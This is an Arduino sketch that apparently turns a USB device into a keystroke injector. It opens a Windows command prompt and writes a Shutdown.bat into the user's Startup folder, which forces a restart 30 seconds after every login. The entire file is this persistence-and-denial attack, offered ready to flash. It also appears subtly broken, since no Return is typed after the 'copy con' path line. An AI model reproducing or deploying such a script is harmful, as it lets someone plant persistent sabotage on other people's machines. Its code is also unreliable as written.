#include <Keyboard.h> 
/*
 * Developer @root_haxor !
 */

// Init function
void setup()
{
  // Begining the stream
  Keyboard.begin();

  // Waiting 500ms for init
  delay(500);

  typeKey(27);

  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(27);
  Keyboard.releaseAll();

  delay(400);

  Keyboard.print("cmd");

  typeKey(KEY_RETURN);

  delay(100);

  // start making Shutdown.bat
  Keyboard.print("copy con \"%userprofile%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Shutdown.bat\"");

  Keyboard.print("@echo off");

  typeKey(KEY_RETURN);

  Keyboard.print("shutdown /r /t 30");

  // The shutdown command has many good options '/t' adds a Delay, and '/r' restarts
  // '/s' will shut the computer down and '/l' (L) is to just logoff the user more options are available by running 'shutdown /?'
  typeKey(KEY_RETURN);

  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(122);
  Keyboard.releaseAll();

  Keyboard.print("exit");

  typeKey(KEY_RETURN);
}

void typeKey(int key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

// Unused
void loop() {}
